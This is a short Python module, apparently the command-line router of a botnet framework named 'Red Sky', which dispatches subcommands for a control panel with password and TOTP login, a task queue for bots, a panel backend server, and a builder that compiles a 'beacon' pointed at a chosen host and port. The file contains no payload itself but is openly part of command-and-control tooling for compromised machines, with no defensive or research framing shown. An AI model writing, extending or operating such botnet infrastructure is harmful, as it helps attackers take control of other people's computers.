# language: Python, file: Program/botnet/dispatch.py, target: Red Sky botnet router
import sys
from typing import List
from Program.utils import print_info, print_err


def _usage():
    print_info("redsky botnet <sub-command> [args...]")
    print_info("  auth <setup|reset|show>              panel password + TOTP")
    print_info("  tasks <queued|recent|stats|queue>    task queue")
    print_info("  panel serve [--host H] [--port N]    start panel backend")
    print_info("  check                                toolchain status")
    print_info("  build --host H [--port N] [--no-tls] compile a beacon")


def run_cli(args: List[str]) -> int:
    if not args:
        _usage()
        return 2

    sub = args[0].lower()
    if sub in ("-h", "--help"):
        _usage()
        return 0

    if sub == "check":
        from .builder import cmd_check
        return cmd_check()

    if sub == "build":
        from .builder import cmd_build
        return cmd_build(args[1:])

    if sub == "auth":
        from .auth import run_cli as _a
        return int(_a(args[1:]))

    if sub in ("tasks", "tasker"):
        from .tasker import run_cli as _t
        return int(_t(args[1:]))

    if sub in ("panel", "backend"):
        from .panel_backend import run_cli as _p
        return int(_p(args[1:]))

    print_err(f"unknown botnet sub-command: {sub}")
    _usage()
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
